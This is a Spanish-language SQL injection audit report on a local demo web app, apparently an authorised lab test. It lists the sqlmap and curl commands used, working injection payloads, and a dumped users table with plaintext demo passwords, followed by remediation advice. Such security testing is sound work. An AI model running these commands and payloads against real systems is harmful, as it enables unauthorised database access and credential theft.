# Informe de Auditoria SQLi - http://web.dev.local:8083

## Resumen Ejecutivo
Se realizo una auditoria DAST sobre `http://web.dev.local:8083` enfocada en inyeccion SQL. Se identifico un unico vector de entrada relevante: el parametro GET `id` del formulario principal `/?id=`. La ejecucion de `sqlmap --batch --forms` confirmo que el parametro es vulnerable a multiples tecnicas de SQL injection contra un backend MySQL/MariaDB.

La vulnerabilidad fue explotada con exito. Se obtuvo el usuario actual de base de datos (`root@%`), la base activa (`sqli_demo`), el listado de bases de datos, la tabla `users` y su contenido, incluyendo nombres de usuario y contrasenas en texto claro.

## Vectores Analizados
1. `GET /?id=` detectado en el formulario HTML principal.
2. Endpoints comunes probados sin exito adicional: `/robots.txt`, `/sitemap.xml`, `/api/`, `/login`.

## Reconocimiento
- Pagina principal: `Search Users`
- Formulario encontrado:
  - Metodo: `GET`
  - Action: `#` (resuelve a `/`)
  - Parametros: `id`, `Submit`
- Tecnologias observadas en cabeceras:
  - `Apache/2.4.65 (Debian)`
  - `PHP/8.1.33`

## Comandos Ejecutados
### Reconocimiento
```bash
curl -sS -D headers_target_root.txt -o target_root.html http://web.dev.local:8083/
curl -sS 'http://web.dev.local:8083/?id=1'
curl -sS 'http://web.dev.local:8083/?id=999'
curl -sS 'http://web.dev.local:8083/?id=1%27'
```

### Descubrimiento
```bash
sqlmap -u 'http://web.dev.local:8083/?id=1' -p id --batch --level=3 --risk=2 --flush-session
sqlmap -u 'http://web.dev.local:8083/' --forms --batch --level=5 --risk=3 --random-agent
```

### Explotacion
```bash
sqlmap -u 'http://web.dev.local:8083/?id=1&Submit=Submit' -p id --batch --current-user --current-db --dbs
sqlmap -u 'http://web.dev.local:8083/?id=1&Submit=Submit' -p id --batch -D sqli_demo --tables
sqlmap -u 'http://web.dev.local:8083/?id=1&Submit=Submit' -p id --batch -D sqli_demo -T users --columns
sqlmap -u 'http://web.dev.local:8083/?id=1&Submit=Submit' -p id --batch -D sqli_demo -T users --dump
```

## Hallazgos
### Hallazgo 1: SQL Injection en `id` (GET)
Se confirmo SQL injection en el parametro `id` del formulario principal.

**Payloads exactos reportados por sqlmap:**
- Boolean-based blind:
  ```
  id=1270' OR NOT 8756=8756-- BGGz&Submit=Submit
  ```
- Error-based:
  ```
  id=1270' AND EXTRACTVALUE(6475,CONCAT(0x5c,0x71786a6a71,(SELECT (ELT(6475=6475,1))),0x7171717071))-- qOtk&Submit=Submit
  ```
- Time-based blind:
  ```
  id=1270' AND (SELECT 1686 FROM (SELECT(SLEEP(5)))IWEM)-- sRvo&Submit=Submit
  ```
- UNION query:
  ```
  id=1270' UNION ALL SELECT CONCAT(0x71786a6a71,0x7667634c554c4750436741556c4d50436b6d527859636c5070506d7575556e5846504e7359417654,0x7171717071),NULL-- -&Submit=Submit
  ```

**DBMS identificado por sqlmap:**
- `MySQL >= 5.1 (MariaDB fork)`

**Nota operacional:**
La primera ejecucion directa de `sqlmap` contra `?id=1` no confirmo la inyeccion. La segunda ejecucion usando `--forms` si la confirmo al probar el flujo real del formulario con `Submit=Submit`.

## Evidencia de Explotacion
### Contexto de base de datos
- Usuario actual: `root@%`
- Base de datos actual: `sqli_demo`
- Bases disponibles:
  - `information_schema`
  - `mysql`
  - `performance_schema`
  - `sqli_demo`
  - `sys`

### Enumeracion de esquema
- Base analizada: `sqli_demo`
- Tabla encontrada: `users`
- Columnas encontradas:
  - `user_id`
  - `email`
  - `password`
  - `username`
  - `last_name`
  - `first_name`

### Datos extraidos de `sqli_demo.users`
| user_id | email | password | username | last_name | first_name |
|---|---|---|---|---|---|
| 1 | admin@example.com | password123 | admin | Doe | John |
| 2 | jane@example.com | secret456 | jsmith | Smith | Jane |
| 3 | bob@example.com | mypass789 | bjohnson | Johnson | Bob |
| 4 | alice@example.com | qwerty123 | awilliams | Williams | Alice |
| 5 | charlie@example.com | password | cbrown | Brown | Charlie |
| 6 | diana@example.com | secure123 | ddavis | Davis | Diana |
| 7 | eve@example.com | hackme | emiller | Miller | Eve |
| 8 | frank@example.com | admin123 | fwilson | Wilson | Frank |

## Conclusiones
La aplicacion es vulnerable a SQL injection explotable en el parametro GET `id`. El impacto es critico porque permite enumerar el DBMS, identificar la base activa y exfiltrar datos sensibles de la tabla `users`, incluidas contrasenas en texto claro. La presencia de credenciales sin hash agrava severamente el riesgo.

## Recomendaciones
- Sustituir consultas dinamicas por sentencias preparadas con parametros.
- Validar y tipar estrictamente `id` como entero en servidor.
- Minimizar privilegios de la cuenta de base de datos usada por la aplicacion.
- Almacenar contrasenas con hashing robusto (`bcrypt`, `argon2`) y rotarlas.
- Implementar registro y monitorizacion de errores y patrones de ataque.
